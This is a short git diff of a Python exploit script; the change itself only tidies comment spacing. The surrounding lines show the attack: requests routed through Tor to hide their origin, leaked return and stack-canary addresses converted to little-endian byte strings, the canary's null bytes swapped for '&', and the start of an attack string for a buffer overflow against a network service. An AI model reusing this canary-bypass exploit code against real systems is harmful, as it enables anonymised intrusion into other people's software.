@@ -5,7 +5,7 @@ import os
 
 rt = RequestsTor() #for Tor Browser
 rt = RequestsTor(tor_ports=(9050,), tor_cport=9051) #for Tor
-# rt = RequestsTor(tor_ports=(9150,), tor_cport=9151) #for Windows Tor
+#rt = RequestsTor(tor_ports=(9150,), tor_cport=9151) #for Windows Tor
 
 #rt = requests #To run the attack locally, comment out the first two lines about Tor and uncomment this line here.
 
@@ -38,7 +38,7 @@ canary_addr = hex(canary_addr)[2:]
 #Reversing by two bytes the values we have (because of little endianness).
 ret_addr = "".join(reversed([r'\x' + ret_addr[i:i+2] for i in range(0, len(ret_addr), 2)]))
 canary_addr = "".join(reversed([r'\x' + canary_addr[i:i+2] for i in range(0, len(canary_addr), 2)]))
-canary = "".join(reversed([r'\x' + canary[i:i+2] for i in range(0, len(canary), 2)])).replace('00', '26') # replacing the 00 with 26(ascii of '&').
+canary = "".join(reversed([r'\x' + canary[i:i+2] for i in range(0, len(canary), 2)])).replace('00', '26') #replacing the 00 with 26(ascii of '&').
 
 #Building the attack string.
 attack_str = ''
